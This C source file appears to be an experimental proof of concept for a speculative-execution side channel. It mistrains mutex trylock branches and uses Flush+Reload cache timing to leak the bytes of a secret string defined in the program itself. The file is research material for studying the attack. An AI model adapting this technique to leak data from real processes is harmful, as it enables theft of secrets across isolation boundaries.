#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 3
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 250
#define SECRET_SIZE 8
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1
#define DBG 0

#define FLAG PTHREAD_MUTEX_DEFAULT
//#define FLAG PTHREAD_MUTEX_ADAPTIVE_NP

cp_t* flush_reload_arr;
pthread_mutex_t k;

void* thread1(void* data) {

    char* allow_lock = (char*)data;
    printf("t1\tlock_bool %d\n", *allow_lock);
    if(*allow_lock) {
        pthread_mutex_lock(&k);
        sleep(1);
        pthread_mutex_unlock(&k);
        printf("t1\tunlocked!\n");
    }


    return NULL;
}

void* thread2(void* data) {

    char* s = (char*)data;
    printf("t2\tsecret_i %d\n", *s);
    if(pthread_mutex_trylock(&k) == 0) {
        //volatile cp_t cp = flush_reload_arr[SECRET[0]];
        volatile cp_t cp1 = flush_reload_arr[SECRET[*s]];
        printf("t2\tTrylocked!!!\n");
        pthread_mutex_unlock(&k);
    }
    //volatile cp_t cp = flush_reload_arr[1];

    return NULL;
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
    char lock_booleans[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        lock_booleans[i] = false;
    }
    lock_booleans[n_accesses-1] = true;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        printf("\nround %d\n", i);
        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread1, &lock_booleans[i]);
        cpuid();
        //pthread_create(&t2, NULL, thread2, &secret_index);

        printf("t2\tsecret_i %d\n", secret_index);
        flush((void*)&k);
        cpuid();
        if(pthread_mutex_trylock(&k) == 0) {
            //volatile cp_t cp = flush_reload_arr[SECRET[0]];
            volatile cp_t cp1 = flush_reload_arr[SECRET[secret_index]];
            printf("t2\tTrylocked!!!\n");
            pthread_mutex_unlock(&k);
        }
        //volatile cp_t cp = flush_reload_arr[0];*/

        pthread_join(t1, NULL);
        //pthread_join(t2, NULL);

        cpuid();
        if(lock_booleans[i] == false) {
            cpuid();
            printf("flushing arr!\n");
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();

    }
    //volatile cp_t temp_cp = flush_reload_arr[0];
    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    pthread_mutex_init(&k, FLAG);
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    //results[0][0] = prepare(1);
    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);
    pthread_mutex_destroy(&k);
}